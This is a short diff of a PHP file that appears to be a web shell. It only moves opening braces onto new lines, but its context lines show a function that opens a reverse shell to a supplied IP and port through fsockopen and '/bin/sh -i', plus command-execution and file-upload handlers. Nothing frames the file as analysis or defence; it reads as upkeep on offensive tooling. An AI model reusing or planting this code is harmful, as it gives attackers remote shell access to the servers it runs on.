@@ -123,7 +123,8 @@ function executeCommand(string $command)
    return false;
 }
 
-function openReverseShell(string $ip, string $port) {
+function openReverseShell(string $ip, string $port)
+{
    $command = '/bin/sh -i <&3 >&3 2>&3';
    $socket  = fsockopen($ip, $port, $errcode, $errmsg);
 
@@ -139,7 +140,8 @@ function openReverseShell(string $ip, string $port) {
    return false;
 }
 
-function isRequestFileUpload($upload) {
+function isRequestFileUpload($upload)
+{
    if (empty($upload)) {
       return false;
    }
@@ -154,7 +156,8 @@ function isRequestFileUpload($upload) {
    return true;
 }
 
-function handleFileUpload(array $upload) {
+function handleFileUpload(array $upload)
+{
    if (!empty($upload['error'])) {
       return $upload['error'];
    }
